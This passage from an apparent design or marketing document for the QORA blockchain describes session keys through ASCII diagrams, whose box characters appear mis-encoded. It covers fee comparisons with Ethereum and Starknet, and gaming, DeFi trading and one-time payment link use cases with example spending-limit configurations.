â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  $2,025          â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  STARKNET (Account Abstraction)                                     â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                     â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  Create session key:             $0.01                              â”‚   â”‚
â”‚  â”‚  1000 transactions Ã— $0.01:     $10.00                              â”‚   â”‚
â”‚  â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                              â”‚   â”‚
â”‚  â”‚  TOTAL:                         $10.01                              â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  â–Œ $10                                                              â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  QORA (Native Session Keys)                                          â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                          â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  Create session key:            $0.001                              â”‚   â”‚
â”‚  â”‚  1000 transactions Ã— $0.001:    $1.000                              â”‚   â”‚
â”‚  â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                              â”‚   â”‚
â”‚  â”‚  TOTAL:                         $1.001                              â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  â”‚ $1                                                               â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  SAVINGS COMPARISON                                                         â”‚
â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                                         â”‚
â”‚                                                                             â”‚
â”‚  QORA vs Ethereum:  99.95% cheaper  (2025x savings)                         â”‚
â”‚  QORA vs Starknet:  90% cheaper     (10x savings)                           â”‚
â”‚                                                                             â”‚
â”‚  For a game with 10,000 daily users Ã— 100 actions:                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚  Ethereum:  $2,000,000/day   â†’  ECONOMICALLY IMPOSSIBLE            â”‚   â”‚
â”‚  â”‚  Starknet:    $10,000/day    â†’  Expensive for games                â”‚   â”‚
â”‚  â”‚  QORA:          $1,000/day    â†’  VIABLE FOR MASS ADOPTION           â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Use Cases

### Gaming

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                            GAMING USE CASE                                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  SCENARIO: Player starts a 4-hour gaming session                           â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  SETUP (Once per session - 5 seconds)                               â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                               â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  1. Player clicks "Start Playing"                                   â”‚   â”‚
â”‚  â”‚  2. Fingerprint prompt appears                                      â”‚   â”‚
â”‚  â”‚  3. Session key created with rules:                                 â”‚   â”‚
â”‚  â”‚     â€¢ Max 50 QORA per transaction                                    â”‚   â”‚
â”‚  â”‚     â€¢ Total limit: 200 QORA                                          â”‚   â”‚
â”‚  â”‚     â€¢ Only game contract: qora1game...                               â”‚   â”‚
â”‚  â”‚     â€¢ Expires in 4 hours                                            â”‚   â”‚
â”‚  â”‚     â€¢ 500 max uses                                                  â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  GAMEPLAY (No interruptions!)                                       â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                       â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  Action                    Traditional        With Session Keys     â”‚   â”‚
â”‚  â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€     â”‚   â”‚
â”‚  â”‚  Move character           Sign tx âŒ          Instant âœ…            â”‚   â”‚
â”‚  â”‚  Attack enemy             Sign tx âŒ          Instant âœ…            â”‚   â”‚
â”‚  â”‚  Collect loot             Sign tx âŒ          Instant âœ…            â”‚   â”‚
â”‚  â”‚  Buy potion (10 QORA)      Sign tx âŒ          Instant âœ…            â”‚   â”‚
â”‚  â”‚  Upgrade weapon (30 QORA)  Sign tx âŒ          Instant âœ…            â”‚   â”‚
â”‚  â”‚  Trade with player        Sign tx âŒ          Instant âœ…            â”‚   â”‚
â”‚  â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€     â”‚   â”‚
â”‚  â”‚  Total interruptions:     200+ prompts        0 prompts             â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  SECURITY DURING GAMEPLAY                                           â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                           â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  Malicious action attempted        Result                           â”‚   â”‚
â”‚  â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€     â”‚   â”‚
â”‚  â”‚  Transfer 1000 QORA                 âŒ BLOCKED (exceeds limit)       â”‚   â”‚
â”‚  â”‚  Send to hacker address            âŒ BLOCKED (not game contract)   â”‚   â”‚
â”‚  â”‚  Call DeFi protocol                âŒ BLOCKED (not allowed)         â”‚   â”‚
â”‚  â”‚  Drain wallet                      âŒ IMPOSSIBLE                    â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  MAXIMUM POSSIBLE LOSS: 200 QORA (total_spend_limit)                 â”‚   â”‚
â”‚  â”‚  REMAINING FUNDS: 100% SAFE                                         â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### DeFi Trading

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                           DEFI TRADING USE CASE                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  SCENARIO: Day trader on DEX                                               â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  SESSION KEY CONFIGURATION                                          â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                          â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  {                                                                   â”‚   â”‚
â”‚  â”‚    "max_amount_per_tx": "1000 QORA",                                 â”‚   â”‚
â”‚  â”‚    "total_spend_limit": "10000 QORA",                                â”‚   â”‚
â”‚  â”‚    "allowed_contracts": [                                           â”‚   â”‚
â”‚  â”‚      "qora1dex...",        // DEX contract                           â”‚   â”‚
â”‚  â”‚      "qora1pool..."        // Liquidity pool                         â”‚   â”‚
â”‚  â”‚    ],                                                                â”‚   â”‚
â”‚  â”‚    "allowed_msg_types": [                                           â”‚   â”‚
â”‚  â”‚      "/dex.Swap",                                                   â”‚   â”‚
â”‚  â”‚      "/dex.AddLiquidity",                                           â”‚   â”‚
â”‚  â”‚      "/dex.RemoveLiquidity"                                         â”‚   â”‚
â”‚  â”‚    ],                                                                â”‚   â”‚
â”‚  â”‚    "expires_at": "8 hours",                                         â”‚   â”‚
â”‚  â”‚    "max_uses": 500                                                  â”‚   â”‚
â”‚  â”‚  }                                                                   â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  TRADING DAY EXPERIENCE                                             â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                             â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  8:00 AM   Create session key (one fingerprint)                     â”‚   â”‚
â”‚  â”‚  8:01 AM   Swap QORA â†’ USDC                    âœ… Instant            â”‚   â”‚
â”‚  â”‚  8:15 AM   Swap USDC â†’ ETH                    âœ… Instant            â”‚   â”‚
â”‚  â”‚  9:30 AM   Add liquidity QORA/USDC             âœ… Instant            â”‚   â”‚
â”‚  â”‚  10:45 AM  Swap ETH â†’ QORA                     âœ… Instant            â”‚   â”‚
â”‚  â”‚  ...       (50+ more trades)                                        â”‚   â”‚
â”‚  â”‚  4:00 PM   Session expires, key deleted                             â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  RESULT: CEX-like experience with DEX security                      â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### One-Time Payment Links

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                       ONE-TIME PAYMENT LINK USE CASE                        â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
â”‚  SCENARIO: Send money to a friend who doesn't have crypto                  â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  1. CREATE PAYMENT LINK                                             â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                             â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  You create single-use session key:                                 â”‚   â”‚
â”‚  â”‚  {                                                                   â”‚   â”‚
â”‚  â”‚    "max_uses": 1,                    // ONE TIME ONLY               â”‚   â”‚
â”‚  â”‚    "auto_delete_on_exhaustion": true,                               â”‚   â”‚
â”‚  â”‚    "max_amount_per_tx": "100 QORA",   // Exactly this amount         â”‚   â”‚
â”‚  â”‚    "expires_at": "7 days"            // Must claim within 7 days    â”‚   â”‚
â”‚  â”‚  }                                                                   â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  Generate link: https://pay.qora.io/claim/abc123                     â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  2. FRIEND CLAIMS PAYMENT                                           â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                           â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  Friend clicks link:                                                â”‚   â”‚
â”‚  â”‚  â€¢ Creates wallet (or connects existing)                            â”‚   â”‚
â”‚  â”‚  â€¢ Session key executes transfer                                    â”‚   â”‚
â”‚  â”‚  â€¢ 100 QORA sent to friend                                           â”‚   â”‚
â”‚  â”‚  â€¢ Session key IMMEDIATELY DELETED                                  â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  Link cannot be used again - key no longer exists!                  â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  3. SECURITY GUARANTEES                                             â”‚   â”‚
â”‚  â”‚  â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•                                             â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â”‚  âœ… Only 100 QORA can be claimed (not more)                          â”‚   â”‚
â”‚  â”‚  âœ… Can only be claimed once                                        â”‚   â”‚
â”‚  â”‚  âœ… Expires if not claimed                                          â”‚   â”‚
â”‚  â”‚  âœ… Your wallet remains secure                                      â”‚   â”‚
â”‚  â”‚  âœ… No need to share private key or seed                            â”‚   â”‚
â”‚  â”‚                                                                      â”‚   â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â”‚                                                                             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## Economic Model

### Fee Structure

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                              FEE STRUCTURE                                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                             â”‚
